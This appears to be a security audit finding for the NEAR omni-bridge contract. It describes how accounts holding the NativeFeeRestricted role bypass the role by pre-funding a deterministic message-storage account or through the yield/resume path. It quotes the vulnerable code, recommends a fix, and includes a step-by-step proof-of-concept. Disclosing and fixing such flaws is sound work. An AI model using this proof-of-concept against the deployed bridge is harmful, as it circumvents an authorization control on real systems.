### Title
`NativeFeeRestricted` Role Bypass via Message-Account Pre-Funding in `init_transfer` - (`near/omni-bridge/src/lib.rs`)

### Summary

The `NativeFeeRestricted` role is intended to prevent certain accounts from setting a non-zero `native_token_fee` in bridge transfers. However, the role check only exists in one of two code paths inside `init_transfer`. A restricted account can bypass the check entirely by pre-funding the deterministic virtual message-storage account before calling `ft_transfer_call`, causing `try_to_transfer_balance_from_message_account` to succeed and short-circuit the role check. The same bypass is also available through the yield/resume path (`init_transfer_resume`), which contains no `NativeFeeRestricted` check at all.

### Finding Description

In `near/omni-bridge/src/lib.rs`, the `init_transfer` function selects one of three execution paths:

```
Path 1 (message-account funded):
  try_to_transfer_balance_from_message_account(...).is_ok()
  → proceeds immediately — NO NativeFeeRestricted check

Path 2 (signer has own storage balance):
  has_storage_balance(...) && (native_fee == 0 || !acl_has_role(NativeFeeRestricted, signer))
  → NativeFeeRestricted IS checked here

Path 3 (yield/resume):
  → init_transfer_resume — NO NativeFeeRestricted check
``` [1](#0-0) 

The `NativeFeeRestricted` check only guards Path 2. Paths 1 and 3 are completely unguarded.

**Root cause — Path 1 bypass:**

The virtual message-storage account ID (`message_storage_account_id`) is a deterministic hash of the transfer parameters (token, amount, recipient, fee, sender, msg, optional external_id). Crucially, the nonces are **not** part of the hash, so the account ID can be computed before the transfer is submitted. [2](#0-1) 

A `NativeFeeRestricted` account can:
1. Compute the virtual account ID for a transfer with non-zero `native_token_fee`.
2. Call `storage_deposit` on the bridge for that virtual account ID, depositing enough to cover the native fee and storage.
3. Call `ft_transfer_call` → `ft_on_transfer` → `init_transfer` with non-zero `native_token_fee`.
4. `try_to_transfer_balance_from_message_account` succeeds (the virtual account is funded), so Path 1 is taken and the `NativeFeeRestricted` check is never reached. [3](#0-2) 

**Root cause — Path 3 (yield/resume) bypass:**

If the user does not pre-fund the virtual account and does not have enough own storage balance, the code falls into the yield path and registers an `init_transfer_resume` callback. When the user later calls `storage_deposit` for the virtual account, `init_transfer_resume` fires and calls `try_to_transfer_balance_from_message_account` with no `NativeFeeRestricted` check. [4](#0-3) 

### Impact Explanation

The `NativeFeeRestricted` role is an authorization control that prevents designated accounts from attaching a non-zero NEAR native fee to their bridge transfers. Both bypass paths allow a `NativeFeeRestricted` account to circumvent this restriction and successfully initiate a transfer with a non-zero `native_token_fee`, violating the role's intended invariant. This is a role/authorization bypass — explicitly listed as a Critical impact category in the target scope.

### Likelihood Explanation

The bypass is fully attacker-controlled and requires no privileged access beyond holding the `NativeFeeRestricted` role. The virtual account ID is deterministic and publicly computable from on-chain data before the transfer is submitted. The attack requires only two standard on-chain calls (`storage_deposit` then `ft_transfer_call`) and no special timing or race conditions.

### Recommendation

Add a `NativeFeeRestricted` check at the top of `init_transfer`, before the three-way branch, so that no path can bypass it:

```rust
fn init_transfer(...) -> PromiseOrPromiseIndexOrValue<U128> {
    // Guard must come before any path selection
    if init_transfer_msg.native_token_fee.0 > 0 {
        require!(
            !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone()),
            BridgeError::NativeFeeNotAllowed.as_ref()
        );
    }
    // ... rest of the function
}
```

Equivalently, add the same guard at the start of `init_transfer_resume` so the yield path is also protected.

### Proof of Concept

```
// Attacker: account with NativeFeeRestricted role
// Step 1: compute the deterministic virtual account ID off-chain
let storage_account = TransferMessageStorageAccount {
    token: OmniAddress::Near(token_id.clone()),
    amount: U128(transfer_amount),
    recipient: eth_recipient.clone(),
    fee: Fee { fee: U128(0), native_fee: U128(native_fee_amount) },
    sender: OmniAddress::Near(attacker_id.clone()),
    msg: String::new(),
};
let virtual_acct_id = storage_account.id(None);

// Step 2: pre-fund the virtual account — no role check here
attacker.call(bridge.id(), "storage_deposit")
    .args_json(json!({ "account_id": virtual_acct_id }))
    .deposit(native_fee_amount + required_storage)
    .transact().await?;

// Step 3: initiate transfer with non-zero native_token_fee
// try_to_transfer_balance_from_message_account succeeds → Path 1 taken
// NativeFeeRestricted check is never reached
attacker.call(token.id(), "ft_transfer_call")
    .args_json(json!({
        "receiver_id": bridge.id(),
        "amount": U128(transfer_amount),
        "msg": serde_json::to_string(&InitTransferMsg {
            native_token_fee: U128(native_fee_amount), // restricted but succeeds
            fee: U128(0),
            recipient: eth_recipient,
            msg: None,
            external_id: None,
        })?,
    }))
    .deposit(NearToken::from_yoctonear(1))
    .transact().await?;
// Transfer is accepted with non-zero native_token_fee despite NativeFeeRestricted role
```

### Citations

**File:** near/omni-bridge/src/lib.rs (L566-584)
```rust
        if self
            .try_to_transfer_balance_from_message_account(
                &message_storage_account_id,
                NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
                &signer_id,
                required_storage_balance,
            )
            .is_ok()
            || (self.has_storage_balance(
                &signer_id,
                required_storage_balance.saturating_add(NearToken::from_yoctonear(
                    init_transfer_msg.native_token_fee.0,
                )),
            ) && (init_transfer_msg.native_token_fee.0 == 0
                || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
        {
            PromiseOrPromiseIndexOrValue::Value(
                self.init_transfer_internal(transfer_message, signer_id),
            )
```

**File:** near/omni-bridge/src/lib.rs (L621-646)
```rust
    #[private]
    #[allow(clippy::needless_pass_by_value)]
    pub fn init_transfer_resume(
        &mut self,
        transfer_message: TransferMessage,
        message_storage_account_id: AccountId,
        storage_owner: AccountId,
        #[callback_result] response: Result<(), PromiseError>,
    ) -> U128 {
        self.remove_promise(&message_storage_account_id);
        if response.is_err() {
            env::log_str("Init transfer resume timeout");
        }

        if let Err(err) = self.try_to_transfer_balance_from_message_account(
            &message_storage_account_id,
            NearToken::from_yoctonear(transfer_message.fee.native_fee.0),
            &storage_owner,
            self.required_balance_for_init_transfer_message(transfer_message.clone()),
        ) {
            env::log_str(&format!("Error paying native fee and storage: {err}"));
            return transfer_message.amount;
        }

        self.init_transfer_internal(transfer_message, storage_owner)
    }
```

**File:** near/omni-types/src/lib.rs (L610-620)
```rust
impl TransferMessageStorageAccount {
    #[allow(clippy::missing_panics_doc)]
    pub fn id(&self, external_id: Option<String>) -> AccountId {
        let mut bytes = borsh::to_vec(self).unwrap();
        if let Some(external_id) = external_id {
            bytes.extend_from_slice(external_id.as_bytes());
        }
        let hash = utils::sha256(&bytes);
        let implicit_account_id = hex::encode(hash);
        AccountId::try_from(implicit_account_id).unwrap()
    }
```

**File:** near/omni-bridge/src/storage.rs (L260-290)
```rust
    pub(crate) fn try_to_transfer_balance_from_message_account(
        &mut self,
        account_id: &AccountId,
        native_fee: NearToken,
        storage_payer: &AccountId,
        required_storage_payer_balance: NearToken,
    ) -> Result<(), StorageError> {
        let balance = self
            .accounts_balances
            .get(account_id)
            .ok_or(StorageError::MessageAccountNotRegistered)?;

        if balance.total < native_fee {
            return Err(StorageError::NotEnoughBalanceForFee);
        }

        let mut storage = self
            .accounts_balances
            .get(storage_payer)
            .ok_or(StorageError::SignerNotRegistered)?;

        storage.available = storage.available.saturating_add(balance.total);

        if storage.available < required_storage_payer_balance.saturating_add(native_fee) {
            return Err(StorageError::SignerNotEnoughBalance);
        }

        self.accounts_balances.insert(storage_payer, &storage);
        self.accounts_balances.remove(account_id);
        Ok(())
    }
```
